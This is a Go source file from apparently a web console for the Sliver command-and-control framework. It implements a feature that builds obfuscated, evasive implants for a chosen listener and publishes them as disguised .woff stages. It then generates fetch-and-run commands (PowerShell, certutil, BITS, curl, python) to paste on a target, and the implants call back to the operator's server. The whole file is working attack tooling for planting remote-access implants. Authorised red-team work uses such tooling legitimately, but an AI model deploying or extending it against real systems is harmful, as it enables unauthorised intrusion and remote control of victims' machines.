package sliver

import (
	"fmt"
	"net"
	"sort"
	"strconv"
	"strings"
	"sync"
)

// OneLiner is the "get a session from one command" feature.
//
// The operator picks a listener that is already up, and gets back a command to
// paste into a shell on the target. Everything in between -- which C2 address the
// implant dials, what the stage is called, which URL serves it -- is derived from
// the listener, so the command and the thing it points at cannot disagree.
//
// That derivation is the whole point. WebDelivery already existed and already
// worked, but it asked for a profile name, a host and a port separately, and the
// operator had to keep those three consistent with a listener they had started
// somewhere else. A one-liner that fetches a path nobody is serving fails on the
// target with no useful error, and nothing on the console says why -- the
// listener is up, the stage is published, and the command is wrong.

// OneLinerPlatform is the target platform the command is written for.
type OneLinerPlatform string

const (
	OneLinerWindows OneLinerPlatform = "windows"
	OneLinerLinux   OneLinerPlatform = "linux"
	OneLinerDarwin  OneLinerPlatform = "darwin"
)

// OneLinerRequest describes what the operator asked for.
type OneLinerRequest struct {
	// JobID is the listener to build against. It supplies the C2 address and,
	// for an HTTP listener, the port the stage is served on.
	JobID uint32 `json:"job_id"`
	// Platform selects the command template.
	Platform OneLinerPlatform `json:"platform"`
	// Host is the address the target can reach. Empty means "use the listener's
	// own host", which is right when the target can reach the C2 address --
	// often it cannot, and this is the field that fixes it.
	Host string `json:"host"`
	// Name is the implant/build name. Empty means a generated one.
	Name string `json:"name"`
	// Obfuscate and Evasion carry through to the build.
	Obfuscate bool `json:"obfuscate"`
	Evasion   bool `json:"evasion"`
	// Delivery selects the fetch-and-run method. Empty picks a sensible default
	// for the platform.
	Delivery WebDeliveryFormat `json:"delivery"`
	// Path is where the stage is published on the listener's website, and it
	// must differ per platform when more than one is built.
	//
	// It defaults to Sliver's /stage.woff. That default is a single name, so
	// building a Windows and a Linux stage for the same listener published both
	// blobs to the same key and the second replaced the first: the operator got
	// two commands, one of which fetched the other platform's implant and died
	// instantly. Nothing reported an error, because publishing over an existing
	// path is a normal update.
	Path string `json:"path"`
	// Force rebuilds even when an identical stage was built already. Empty
	// means the already-built stage is reused; see stageFingerprint.
	Force bool `json:"force"`
	// ConsoleHost is the address the operator reached this console on, taken
	// from the browser's Host header by the HTTP layer.
	//
	// It is not part of the request body and carries json:"-" for that reason: it
	// is a fallback the console derives, not something the client sends, and it
	// sits below the listener's own bind address in precedence because the
	// console and the listener need not be reachable the same way.
	ConsoleHost string `json:"-"`
}

// OneLinerResult is what the operator gets back.
type OneLinerResult struct {
	// Command is the one-liner to run on the target.
	Command string `json:"command"`
	// URL is what the command fetches.
	URL string `json:"url"`
	// Platform and Delivery echo back what was built, so the UI can show it.
	Platform string `json:"platform"`
	Delivery string `json:"delivery"`
	// C2URL is the address the implant dials. Reported because a one-liner that
	// works but calls back somewhere unreachable looks identical to one that
	// does not work at all.
	C2URL string `json:"c2_url"`
	// JobID is the listener serving the stage, when one was started for it.
	JobID uint32 `json:"job_id"`
	// StagedAs is the implant name the build was created under.
	StagedAs string `json:"staged_as"`
	// Warning carries a non-fatal note.
	Warning string `json:"warning"`
	// Alternatives lists the other delivery methods for the same URL, so the
	// operator can switch without rebuilding.
	Alternatives []OneLinerAlternative `json:"alternatives"`
	// Reused is set when the result came from an earlier build of the same
	// stage rather than from a new one. The bytes are identical, so the only
	// thing it changes is whether the operator needs to know a build ran.
	Reused bool `json:"reused,omitempty"`
}

// OneLinerAlternative is one command template for the same stage.
type OneLinerAlternative struct {
	Delivery string `json:"delivery"`
	Label    string `json:"label"`
	// Platform is the target this template is written for -- an operator looking
	// for a Linux command should not have to know which ids are Linux.
	Platform string `json:"platform"`
	Command  string `json:"command"`
}

// OneLiner builds a stage for a listener and returns the command that fetches it.
//
// The order is deliberate and matches the failure modes:
//
//  1. Read the listener first. An unknown or stopped listener cannot be worked
//     around, and discovering that after building a 20 MB implant wastes the
//     operator's time for no reason.
//  2. Build the stage from the listener's own C2 address, so the implant dials
//     the listener it was made for.
//  3. Publish the stage and derive the URL from where it was actually published,
//     rather than from what the operator typed.
//  4. Only then render the command.
func (c *Client) OneLiner(req OneLinerRequest) (*OneLinerResult, error) {
	platform := req.Platform
	if platform == "" {
		platform = OneLinerWindows
	}
	if platform != OneLinerWindows && platform != OneLinerLinux && platform != OneLinerDarwin {
		return nil, fmt.Errorf("unsupported platform %q", platform)
	}

	job, err := c.findJob(req.JobID)
	if err != nil {
		return nil, err
	}
	if !jobServesStage(job) {
		return nil, fmt.Errorf(
			"listener %d is a %s listener, which cannot serve a stage. Start an HTTP listener, "+
				"or build a payload instead", job.ID, job.Name)
	}

	host, err := callbackHostForJob(job, req.Host, req.ConsoleHost)
	if err != nil {
		return nil, err
	}
	c2Address, err := c2AddressForJob(job, host)
	if err != nil {
		return nil, err
	}

	delivery, err := deliveryForRequest(req.Delivery, platform)
	if err != nil {
		return nil, err
	}

	name := strings.TrimSpace(req.Name)
	if name == "" {
		name = generatedStageName(platform, job.ID)
	}

	// The stage is fetched from the same address the implant dials: both are
	// reached by the target, and letting them differ is how a command ends up
	// fetching from a name the target cannot resolve.
	stageHost := host
	stagePath := strings.TrimSpace(req.Path)
	if stagePath == "" {
		stagePath = defaultWebDeliveryPath
	}
	if !strings.HasPrefix(stagePath, "/") {
		stagePath = "/" + stagePath
	}

	// Everything that decides the stage bytes and the command is known by
	// this point, so an identical request can be answered without building
	// anything.
	//
	// This is the difference between a dialog that is re-opened and a dialog
	// that rebuilds: the operator asks for the command for a listener they
	// already staged and gets the same command back from a map instead of
	// waiting on two more ~20 MB implant builds. The key covers every input
	// that changes the outcome, so a different host, delivery or obfuscation
	// flag misses and rebuilds rather than handing back a stage that no
	// longer matches the request. Force skips the lookup entirely.
	key := stageFingerprint(stageFingerprintInput{
		jobID:     job.ID,
		port:      job.Port,
		platform:  platform,
		c2Address: c2Address,
		stageHost: stageHost,
		stagePath: stagePath,
		name:      name,
		delivery:  delivery,
		obfuscate: req.Obfuscate,
		evasion:   req.Evasion,
	})
	if !req.Force {
		if cached, ok := c.cachedStage(key); ok {
			return cached, nil
		}
	}

	if problem := validateBuildRequest(platformString(platform), "", "exe"); problem != "" {
		return nil, fmt.Errorf("%s", problem)
	}

	// The stage is built from a profile created for this listener. Reusing the
	// operator's own profile would be wrong when its C2 points somewhere else,
	// which is the normal case for someone who has just started a new listener.
	profileName := "oneliner-" + name
	if err := c.ensureStageProfile(profileName, name, platformString(platform), c2Address, req); err != nil {
		return nil, err
	}

	// The stage has to be published to the website this listener actually
	// serves. A listener serving one website cannot see content published to
	// another, so a mismatch produces a URL that 404s while every step --
	// listener up, implant built, content published -- reports success.
	website, known := c.listenerSite(req.JobID)
	if !known {
		return nil, fmt.Errorf(
			"listener %d was not started by this console, so the website it serves is unknown. "+
				"Sliver does not report it: a stage published to the wrong website is invisible to "+
				"the listener and the delivery URL returns 404. Start the listener from here, or "+
				"use the WebDelivery page and name the website explicitly",
			req.JobID)
	}

	res, err := c.WebDelivery(WebDeliveryRequest{
		ProfileName: profileName,
		Host:        stageHost,
		Port:        job.Port,
		Path:        stagePath,
		Format:      delivery,
		Website:     website,
	})
	if err != nil {
		return nil, err
	}

	out := &OneLinerResult{
		Command:      res.Command,
		URL:          res.URL,
		Platform:     string(platform),
		Delivery:     string(delivery),
		C2URL:        c2Address,
		JobID:        res.JobID,
		StagedAs:     name,
		Warning:      res.Warning,
		Alternatives: alternativesFor(res.URL, platform, delivery),
	}
	c.rememberStage(key, out)
	return out, nil
}

// StagePathForPlatform is where a stage for one platform is published.
//
// Distinct per platform, and that is the whole reason it exists. Sliver's
// default stage path is the single name /stage.woff, so building a Windows and a
// Linux stage against one listener published both blobs to the same key and the
// second silently replaced the first -- the operator received two commands, one
// of which downloaded the other platform's implant and failed instantly. Nothing
// reported an error, because writing to an existing path is an ordinary update.
//
// The extension is kept as .woff so the path stays inside what Sliver's HTTP C2
// profile accepts, which is why the default has that suffix at all.
func StagePathForPlatform(platform OneLinerPlatform) string {
	return "/stage-" + strings.ToLower(string(platform)) + ".woff"
}

// OneLinerMulti builds the same listener's stage for several platforms at once.
//
// The per-listener "show me the commands" button needs both a Windows and a
// Linux command, and doing that with N sequential calls to OneLiner costs N
// implant builds on the console's goroutine with no way to see progress, and
// leaves the operator unable to tell a slow build from a hung one. Building
// concurrently keeps that wall-clock time at roughly one build.
//
// Failures are per platform rather than fatal. A Windows and a Linux stage are
// independent artefacts: a build error for one says nothing about the other, and
// discarding a Linux command that would have worked because the Windows build
// failed would be the wrong trade. Each entry therefore carries its own error.
type MultiOneLinerResult struct {
	// Command is the one-liner for this platform.
	Command string `json:"command"`
	// Platform echoes which target this command is for.
	Platform string `json:"platform"`
	// URL is what the command fetches.
	URL string `json:"url"`
	// Delivery is the fetch-and-run method.
	Delivery string `json:"delivery"`
	// StagedAs is the build name, so the operator can find it in the build list.
	StagedAs string `json:"staged_as"`
	// Path is where the stage was published on the listener's website.
	Path string `json:"path"`
	// C2URL is the address the implant dials. Reported for the same reason the
	// single-platform result reports it: a command that calls back somewhere
	// unreachable looks exactly like one that works until it is run.
	C2URL string `json:"c2_url"`
	// Alternatives lists the other ways to fetch the same URL.
	Alternatives []OneLinerAlternative `json:"alternatives"`
	// Reused is set when the stage already existed, so the UI can say the
	// command was not rebuilt rather than implying a fresh build.
	Reused bool `json:"reused,omitempty"`
	// Error is set when this platform could not be built. Empty on success.
	Error string `json:"error,omitempty"`
}

// oneLinerRequestFor derives the per-platform request.
//
// Split out from OneLinerAll so the path decision is testable without a live
// server. That decision is the part with a failure mode: reusing one path for
// both platforms makes the second build overwrite the first, and the resulting
// command is wrong in a way that only shows up on the target.
func oneLinerRequestFor(base OneLinerRequest, p OneLinerPlatform) OneLinerRequest {
	sub := base
	sub.Platform = p
	// An explicit path is only honoured for a single platform. Reusing one for
	// several is the collision this whole function exists to avoid, so a
	// per-platform path wins whenever the caller asked for more than one -- and
	// the caller cannot tell us how many it asked for, so the safe rule is that
	// the path is always derived from the platform.
	sub.Path = StagePathForPlatform(p)
	return sub
}

// OneLinerAll builds a stage for every requested platform, concurrently.
func (c *Client) OneLinerAll(req OneLinerRequest, platforms []OneLinerPlatform) []MultiOneLinerResult {
	if len(platforms) == 0 {
		platforms = []OneLinerPlatform{OneLinerWindows, OneLinerLinux}
	}

	results := make([]MultiOneLinerResult, len(platforms))
	var wg sync.WaitGroup

	for i, p := range platforms {
		wg.Add(1)
		go func(i int, p OneLinerPlatform) {
			defer wg.Done()

			// Each platform gets its own published path, so the builds cannot
			// overwrite one another. See oneLinerRequestFor.
			sub := oneLinerRequestFor(req, p)

			res, err := c.OneLiner(sub)
			if err != nil {
				results[i] = MultiOneLinerResult{
					Platform: string(p),
					Path:     sub.Path,
					Error:    err.Error(),
				}
				return
			}
			results[i] = MultiOneLinerResult{
				Command:      res.Command,
				Platform:     res.Platform,
				URL:          res.URL,
				Delivery:     res.Delivery,
				StagedAs:     res.StagedAs,
				Path:         sub.Path,
				C2URL:        res.C2URL,
				Alternatives: res.Alternatives,
				Reused:       res.Reused,
			}
		}(i, p)
	}
	wg.Wait()

	return results
}

// ensureStageProfile creates or replaces the profile the stage is built from.
//
// A profile is created rather than reusing one of the operator's because the C2
// address has to match the listener this one-liner is for. Someone who has just
// started a listener almost certainly has profiles pointing at other addresses,
// and reusing one of those produces a payload that calls back somewhere else --
// which builds fine, fetches fine, and never checks in.
//
// The name is therefore deterministic from the stage name, so building twice
// against the same listener replaces rather than accumulates. That makes the
// profile list grow with listeners rather than with clicks.
func (c *Client) ensureStageProfile(profileName, stageName, platform, c2Address string, req OneLinerRequest) error {
	cfg := &GenerateRequest{
		Name:      stageName,
		OS:        platform,
		Arch:      "amd64",
		Format:    "exe",
		Interval:  5,
		Jitter:    0,
		MaxErrors: 100,
		Obfuscate: req.Obfuscate,
		Evasion:   req.Evasion,
	}
	// A DNS or WireGuard C2 needs its selectors set as well as the address; the
	// HTTP family does not. Only the HTTP family can serve a stage, so this is
	// the one that matters here, and the flag is set from the address rather
	// than guessed.
	proto := "http"
	if strings.HasPrefix(c2Address, "https://") {
		proto = "https"
	}
	cfg.C2 = append(cfg.C2, struct {
		Address  string `json:"address"`
		Protocol string `json:"protocol"`
	}{Address: strings.TrimPrefix(strings.TrimPrefix(c2Address, "https://"), "http://"), Protocol: proto})

	if problem := validateBuildRequest(cfg.OS, cfg.Arch, cfg.Format); problem != "" {
		return fmt.Errorf("%s", problem)
	}
	return c.SaveImplantProfile(profileName, cfg, false)
}

// findJob resolves the listener, turning a missing one into a sentence rather
// than a zero value.
func (c *Client) findJob(id uint32) (*JobView, error) {
	jobs, err := c.Jobs()
	if err != nil {
		return nil, err
	}
	for i := range jobs {
		if jobs[i].ID == id {
			return &jobs[i], nil
		}
	}
	return nil, fmt.Errorf("no listener with job id %d", id)
}

// jobServesStage reports whether a listener can host a file over HTTP.
//
// Only the HTTP family can: mTLS, DNS, WireGuard and the TCP pivots are not
// fetchable with a command line, so offering a one-liner for them would produce
// a command that cannot work.
func JobServesStage(name string) bool {
	name = strings.ToLower(name)
	return name == "http" || name == "https"
}

// jobServesStage is the JobView form of the same question.
func jobServesStage(job *JobView) bool {
	name := strings.ToLower(job.Name)
	return name == "http" || name == "https"
}

// callbackHostForJob resolves the address an implant is told to dial and the
// stage is fetched from.
//
// The order is the whole point, because every wrong answer here produces a
// command that builds, fetches and never connects:
//
//  1. The host the operator typed. They know the target's network better than
//     the console can, and an explicit answer is never second-guessed.
//  2. The address the listener was actually started on. A listener bound to
//     192.168.1.9 is reachable there and nowhere else, which makes it the most
//     authoritative source the console has -- and the one Sliver does not
//     report, which is why the console records it at start time.
//  3. The address the operator reached this console on, taken from the
//     browser's Host header. It routes here by construction, so it beats a
//     wildcard, but it is a guess: the console and the listener need not be
//     reachable the same way.
//  4. A domain Sliver reports for the listener, which covers a listener started
//     outside this console.
//  5. An address of one of this host's own interfaces, chosen the way the kernel
//     would route outbound traffic. This is what answers when the listener is on
//     a wildcard and the console itself was opened over loopback -- the usual
//     shape of a freshly deployed server, and the case that used to end with the
//     operator typing a wildcard into the host field. It is the weakest source:
//     it says this host is reachable there, not that the listener is.
//
// 0.0.0.0 and :: are bind addresses, not destinations: an implant told to dial
// one dials its own loopback. They are never returned. When none of the sources
// above produces a usable address the one-liner fails and says what to set,
// rather than emitting a command that cannot work.
func callbackHostForJob(job *JobView, operatorHost, consoleHost string) (string, error) {
	if h := strings.TrimSpace(operatorHost); h != "" {
		// A bind address is not a destination, and typing one is a mistake rather
		// than an instruction. validateHost accepts 0.0.0.0 and :: because they are
		// well-formed IP literals, but an implant told to dial one dials its own
		// loopback: the command builds, fetches and never checks in. So the value
		// is skipped -- before validation, so that the wildcard spellings the
		// validator would reject outright are skipped the same way instead of
		// failing the whole request -- and the sources below (the address the
		// listener was started on, the address this console was reached on, a
		// domain) answer instead.
		if !isWildcardHost(h) {
			if err := validateHost(h); err != nil {
				return "", err
			}
			return h, nil
		}
	}
	if h := usableHost(job.CallbackHost); h != "" {
		return h, nil
	}
	if h := usableHost(consoleHost); h != "" {
		return h, nil
	}
	for _, d := range job.Domains {
		if h := usableHost(d); h != "" {
			return h, nil
		}
	}
	// Nothing above names an address. That happens when the listener is on a
	// wildcard and the console was opened over loopback, which is exactly the
	// deployment this console is meant for: the server is reachable at a real
	// address, but the browser used 127.0.0.1 to get here. Asking the machine for
	// the address it would use to reach the network turns that into a working
	// command instead of an error box, and the operator can still correct it in
	// the host field.
	if h := usableHost(localCallbackHost()); h != "" {
		return h, nil
	}
	return "", fmt.Errorf(
		"listener %d has no address a target can reach: %s. Start the listener with a "+
			"callback address, or type one into the host field, and the command will be "+
			"built for it",
		job.ID, bindDescription(job))
}

// SuggestedCallbackHost reports the address a one-liner for this listener would
// dial when the operator types nothing into the host field, or "" when no
// address is available.
//
// It is exported so the console can show the operator that address before the
// build runs. Leaving the field blank while the backend substitutes an address
// is what let a wildcard be typed, silently ignored, and then read back out of
// the generated command as though the console had chosen it.
func SuggestedCallbackHost(job *JobView, consoleHost string) string {
	host, err := callbackHostForJob(job, "", consoleHost)
	if err != nil {
		return ""
	}
	return host
}

// usableHost returns the validated host, or "" when the value cannot serve as a
// callback destination.
//
// The wildcard and loopback checks are the reason this exists: validateHost
// accepts 0.0.0.0, :: and 127.0.0.1 because they are well-formed IP literals, and
// those are exactly the values the console must not pick *for* the operator. An
// implant told to dial any of them dials its own loopback, so a listener recorded
// on 127.0.0.1 is as dead an answer as one recorded on 0.0.0.0 -- it only looks
// healthier, which is why it is skipped here too. An unusable value is skipped
// rather than reported, because every caller is walking a fallback list in which
// the next source may well answer.
//
// Skipping is not forbidding: an operator who types a loopback address into the
// host field still gets it, because a target running on the C2 host is a real
// case. This only stops the console from choosing one silently.
func usableHost(value string) string {
	h := strings.TrimSpace(value)
	if h == "" || isWildcardHost(h) || isLoopbackHost(h) {
		return ""
	}
	if err := validateHost(h); err != nil {
		return ""
	}
	return h
}

// isWildcardHost reports whether the host is a bind-any address rather than a
// destination.
func isWildcardHost(host string) bool {
	switch strings.TrimSpace(host) {
	case "0.0.0.0", "::", "[::]", "*":
		return true
	}
	return false
}

// isLoopbackHost reports whether the host routes only from the machine it names.
//
// A listener started on 127.0.0.1 accepts connections from this host and nowhere
// else, so a command built for a remote target that dials it never checks in.
// The console therefore never picks one on the operator's behalf; see usableHost.
func isLoopbackHost(host string) bool {
	h := strings.TrimSpace(host)
	if strings.EqualFold(h, "localhost") {
		return true
	}
	// A recorded bind address is bare, but a domain or a Host header can arrive
	// with brackets or a port; strip both so every spelling matches.
	if host, _, err := net.SplitHostPort(h); err == nil {
		h = host
	} else if strings.HasPrefix(h, "[") && strings.HasSuffix(h, "]") {
		h = h[1 : len(h)-1]
	}
	ip := net.ParseIP(strings.TrimSpace(h))
	return ip != nil && ip.IsLoopback()
}

// bindDescription says where the listener is bound, for the error above. The
// console records the address it started the listener on; a listener started
// elsewhere has none, and saying so is more useful than an empty sentence.
func bindDescription(job *JobView) string {
	h := strings.TrimSpace(job.CallbackHost)
	if h == "" {
		return "its bind address is unknown to this console"
	}
	if isLoopbackHost(h) {
		return fmt.Sprintf("it was started on %s, which only routes from this host", h)
	}
	return fmt.Sprintf("it was started on %s, which is not a destination", h)
}

// c2AddressForJob builds the address the implant will dial from an already
// resolved host.
//
// The port is the listener's own, because that is what it is listening on, and
// the scheme follows the transport: an HTTPS listener has to produce an https
// callback, or the implant's traffic is refused by the listener it was built
// for.
func c2AddressForJob(job *JobView, host string) (string, error) {
	if strings.TrimSpace(host) == "" {
		return "", fmt.Errorf("listener %d has no callback address", job.ID)
	}
	if job.Port == 0 {
		return "", fmt.Errorf("listener %d reports no port", job.ID)
	}
	scheme := "http"
	if strings.EqualFold(job.Name, "https") {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%d", scheme, hostForURL(host), job.Port), nil
}

// deliveryForRequest resolves an empty delivery to a platform default.
func deliveryForRequest(requested WebDeliveryFormat, platform OneLinerPlatform) (WebDeliveryFormat, error) {
	if requested != "" {
		if !validWebDeliveryFormat(requested) {
			return "", fmt.Errorf("unsupported delivery format %q", requested)
		}
		// Refuse a Windows-only template for a Linux target rather than
		// emitting a command the target cannot run.
		if p := platformForDelivery(requested); p != "" && p != string(platform) {
			return "", fmt.Errorf("delivery %q is for %s, but the target is %s", requested, p, platform)
		}
		return requested, nil
	}
	switch platform {
	case OneLinerLinux, OneLinerDarwin:
		return WebDeliveryCurl, nil
	default:
		return WebDeliveryPSH, nil
	}
}

// platformForDelivery reports the platform a template targets, or "" when it
// works on more than one.
func platformForDelivery(f WebDeliveryFormat) string {
	switch f {
	case WebDeliveryPSH, WebDeliveryCertutil, WebDeliveryBits:
		return string(OneLinerWindows)
	case WebDeliveryPython, WebDeliveryCurl:
		return string(OneLinerLinux)
	}
	return ""
}

// platformString normalises a platform for the build validator.
func platformString(p OneLinerPlatform) string {
	if p == OneLinerDarwin {
		return "darwin"
	}
	return string(p)
}

// generatedStageName makes a name that is legal for the server and readable to
// the operator.
//
// The server accepts only alphanumerics, dot, dash and underscore, and rejects
// the rest -- so anything derived from a listener description has to be cleaned
// rather than passed through.
func generatedStageName(platform OneLinerPlatform, jobID uint32) string {
	return fmt.Sprintf("stage-%s-%d", platform, jobID)
}

// alternativesFor lists the other templates that work for the same URL.
//
// They are returned because the delivery method is the part most likely to need
// changing: a target with PowerShell blocked but certutil allowed, or a Linux
// host with curl but no python. Handing back the alternatives means that is a
// copy-paste rather than a rebuild.
func alternativesFor(url string, platform OneLinerPlatform, chosen WebDeliveryFormat) []OneLinerAlternative {
	var out []OneLinerAlternative
	for _, f := range []WebDeliveryFormat{
		WebDeliveryPSH, WebDeliveryCertutil, WebDeliveryBits,
		WebDeliveryCurl, WebDeliveryPython,
	} {
		if p := platformForDelivery(f); p != "" && p != string(platform) {
			continue
		}
		if f == chosen {
			continue
		}
		label := ""
		for _, m := range WebDeliveryFormats() {
			if m["id"] == string(f) {
				label = m["label"]
			}
		}
		out = append(out, OneLinerAlternative{
			Delivery: string(f),
			Label:    label,
			Platform: platformForDelivery(f),
			Command:  webDeliveryCommand(f, url),
		})
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Delivery < out[j].Delivery })
	return out
}

// stageFingerprintInput is the set of resolved values that decide what a stage
// is. It is a struct rather than a parameter list because several fields share a
// type and a swapped argument would silently key the wrong stage.
type stageFingerprintInput struct {
	jobID     uint32
	port      uint32
	platform  OneLinerPlatform
	c2Address string
	stageHost string
	stagePath string
	name      string
	delivery  WebDeliveryFormat
	obfuscate bool
	evasion   bool
}

// stageFingerprint identifies a built stage by every input that changes its
// bytes or the command that fetches it.
//
// Two requests with the same fingerprint would produce the same implant, publish
// it to the same path and render the same command, so the second is answered
// from the first instead of rebuilding. The separator is a unit separator rather
// than a printable character, so a host or a name that contains it cannot make
// two different stages collide.
func stageFingerprint(in stageFingerprintInput) string {
	return strings.Join([]string{
		strconv.FormatUint(uint64(in.jobID), 10),
		strconv.FormatUint(uint64(in.port), 10),
		string(in.platform),
		in.c2Address,
		in.stageHost,
		in.stagePath,
		in.name,
		string(in.delivery),
		strconv.FormatBool(in.obfuscate),
		strconv.FormatBool(in.evasion),
	}, "\x1f")
}

// cachedStage returns a previously built stage for this fingerprint.
//
// The returned copy has Reused set, so the caller cannot tell a cached entry
// from a fresh build except by that flag, and the entry itself is not mutated.
func (c *Client) cachedStage(key string) (*OneLinerResult, bool) {
	if c.root != nil {
		return c.root.cachedStage(key)
	}
	c.stageMu.Lock()
	defer c.stageMu.Unlock()
	res, ok := c.stageCache[key]
	if !ok {
		return nil, false
	}
	out := res
	out.Reused = true
	return &out, true
}

// rememberStage records a built stage so a later identical request is answered
// without rebuilding it.
//
// Nothing expires an entry: the key is derived from the listener, so the map
// grows with the number of listeners that have been staged rather than with the
// number of clicks, and an entry is a command string rather than a payload.
func (c *Client) rememberStage(key string, res *OneLinerResult) {
	if c.root != nil {
		c.root.rememberStage(key, res)
		return
	}
	c.stageMu.Lock()
	defer c.stageMu.Unlock()
	if c.stageCache == nil {
		c.stageCache = map[string]OneLinerResult{}
	}
	out := *res
	out.Reused = false
	c.stageCache[key] = out
}
